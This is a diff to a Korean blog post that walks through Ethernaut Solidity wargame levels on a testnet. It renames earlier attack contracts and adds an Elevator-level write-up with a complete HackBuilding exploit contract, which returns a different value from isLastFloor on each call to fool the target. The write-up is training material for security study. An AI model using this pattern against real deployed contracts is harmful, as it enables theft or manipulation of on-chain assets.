@@ -282,7 +282,7 @@ function flip(bool _guess) public returns (bool) {
 
 {% highlight javascript %}
 pragma solidity ^0.4.24;
-contract hackCoinFlip {
+contract HackCoinFlip {
 
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip public coinFlip;
@@ -316,8 +316,8 @@ contract CoinFlip {
 {% endhighlight %}
 
 이렇게 되면 side의 값은 _guess 값과 항상 같은 값이 되므로 10번, 100번, 1000번 항상 이기는 게임이 되는 것입니다.
-이를 위해서는 크롬의 콘솔에서는 할 수 없고 이미 배포된 CoinFlip 컨트랙트의 주소를 참조하여 [Remix][remix]에서 hackCoinFlip 컨트랙트를 Ropsten에 배포한 후
-hackCoinFlip의 guess 메소드를 10번 실행하면 되겠습니다(Remix에서 메소드 실행).
+이를 위해서는 크롬의 콘솔에서는 할 수 없고 이미 배포된 CoinFlip 컨트랙트의 주소를 참조하여 [Remix][remix]에서 HackCoinFlip 컨트랙트를 Ropsten에 배포한 후
+HackCoinFlip의 guess 메소드를 10번 실행하면 되겠습니다(Remix에서 메소드 실행).
 
 
 ### 4. Telephone (difficulty 1/10)
@@ -341,7 +341,7 @@ function changeOwner(address _owner) public {
 {% highlight javascript %}
 pragma solidity ^0.4.25;
 
-contract hackTelephone {
+contract HackTelephone {
 
     address public owner;
     Telephone public telephone;
@@ -829,10 +829,104 @@ await getBalance(contract.address)
 "0"
 {% endhighlight %}
 
-참고로 [Ropsten 이더스캔][ropsten-etherscan]에서 트랜잭션이 어떻게 재호출되었는지 확인할 수 있습니다.
+[Ropsten 이더스캔][ropsten-etherscan]에서 트랜잭션이 어떻게 호출되었는지 확인할 수 있습니다(컨트랙트가 소유한 3.5이더를 모두 인출한 경우).
 
 ![fig05]({{site.baseurl}}/assets/img/ethernaut/ropsten_reentrance.PNG)
 
+
+
+### 11. Elevator (difficulty 4/10)
+
+> This elevator won't let you reach the top of your building. Right?
+
+"이 엘리베이터는 빌딩 꼭대기까지 가지 않습니다. 정말 그럴까요?" 문제가 요구하는 것을 이해하는 것 자체가 어렵게 느껴지네요.
+
+솔리디티는 간혹 예상치 못한 방향으로 작동할 때가 있습니다. 문제의 컨트랙트를 살펴보겠습니다. 우선 Building이라는 인터페이스가 있고 Elevator라는 컨트랙트가 있습니다.
+Building 인터페이스를 구현하면서 Elevator 컨트랙트에서 그것을 사용할 것입니다.
+
+{% highlight javascript %}
+if (! building.isLastFloor(_floor)) {
+    floor = _floor;
+    top = building.isLastFloor(floor);
+}
+{% endhighlight %}
+
+`! building.isLastFloor(_floor)`가 true이면 조건문으로 들어갑니다. 이것은 isLastFloor가 false이면
+마지막 층이 몇 층인지 상관없이 마지막 층을 나타내는 bool top이 true가 될 수 없는 것처럼 보입니다.
+
+그런데 여기서 간과한 문제가 있습니다. isLastFloor는 인터페이스로 정의되어 있고 구현하기 나름이라는 점입니다. 또 위의 조건을 잘 보면 isLastFloor를 두 번 호출하고 있습니다.
+다시 말해서 isLastFloor의 두 번째 호출해서도 첫 번째와 동일한 값을 리턴할 것이라고 생각하는 것이죠.
+
+{% highlight javascript %}
+interface Building {
+    function isLastFloor(uint) view public returns (bool);
+}
+{% endhighlight %}
+
+만약에 isLastFloor를 첫 번째에는 false, 이렇게 해서 조건문으로 들어간 다음에, 조건문 내에서, 두 번째에는 true를 리턴하게 만들면 어떻게 될까요? 이렇게 하면
+모든 층에 갈 수 있는 Elevator 컨트랙트가 되는 것입니다(토글 스위치를 생각하면 될 것 같습니다).
+
+{% highlight javascript %}
+pragma solidity ^0.4.25;
+
+interface Building {
+    function isLastFloor(uint) view public returns (bool);
+}
+
+contract HackBuilding is Building {
+
+    address public owner;
+    Elevator public elevator;
+    bool public toggleFlag;
+
+    constructor (address _addr) public {
+        owner = msg.sender;
+        elevator = Elevator(_addr);
+    }
+
+     modifier onlyOwner {
+        require (msg.sender == owner);
+        _;
+    }
+
+    function isLastFloor(uint _floor) view public returns (bool) {
+        _floor;
+        if (!toggleFlag) {
+            toggleFlag = true;
+            return false;
+        } else {
+            toggleFlag = false;
+            return true;
+        }
+    }
+
+    function reachTheTopFloor() external onlyOwner {
+        elevator.goTo(100);
+    }
+}
+
+contract Elevator {
+    function goTo(uint _floor) public;
+}
+{% endhighlight %}
+
+
+다음과 같은 결과가 나오면 성공입니다.
+
+{% highlight html %}
+await contract.top()
+true
+{% endhighlight %}
+
+그런데 잠깐만! isLastFloor 메소드는 상태변수를 읽을 수만 있는 view 메소드인데 bool toggleFlag 상태변수를 어떻게 바꿀 수 있죠? 😕
+그것은 솔리디티 컴파일러 버전에 따라 다릅니다. 여기서 사용한 0.4.25 이하에서는 view 로 지정했다고 하여 컴파일 오류가 발생하지는 않습니다. 그냥 경고만 할 뿐이죠.
+0.5.0 이상에서는 보다 엄격하게 view로 지정된 메소드에서 상태변수를 바꾸는 코드는 컴파일 오류가 발생합니다.
+
+<font color="red" size="2">
+{% highlight html %}
+TypeError: Function declared as view, but this expression (potentially) modifies the state and thus requires non-payable (the default) or payable.
+{% endhighlight %}
+</font>
 
 [ethernaut]: https://ethernaut.zeppelin.solutions/
 [ethernaut-gh]: https://github.com/OpenZeppelin/ethernaut
